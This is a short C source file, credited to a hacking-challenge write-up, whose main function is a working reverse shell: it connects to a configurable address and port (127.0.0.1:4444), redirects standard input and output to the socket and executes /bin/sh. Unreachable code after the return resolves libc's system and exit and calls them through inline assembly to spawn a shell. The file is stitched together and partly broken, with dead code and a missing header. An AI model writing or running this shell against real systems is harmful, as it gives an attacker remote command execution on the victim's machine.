///* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
// Taken from https://gist.github.com/0xabe-io/916cf3af33d1c0592a90
#include "addr-info.h"
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444

int
main (void)
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;

  void (*ptr) (void *);
  ptr = find_func_address ("system", "libc.so.6");
  char *bin_sh = "/bin/sh";
asm (".intel_syntax noprefix;" "mov eax, %0;" "mov ebx, %1;" "push ebx;" "call eax;" ".att_syntax noprefix;":
: "r" (ptr), "r" (bin_sh):"eax", "ebx");

  ptr = find_func_address ("exit", "libc.so.6");
asm (".intel_syntax noprefix;" "mov eax, %0;" "push 0;" "call eax;" ".att_syntax noprefix;":
: "r" (ptr):"eax");

  ptr (0);
  printf ("Do not print me\n");
  return 0;



}
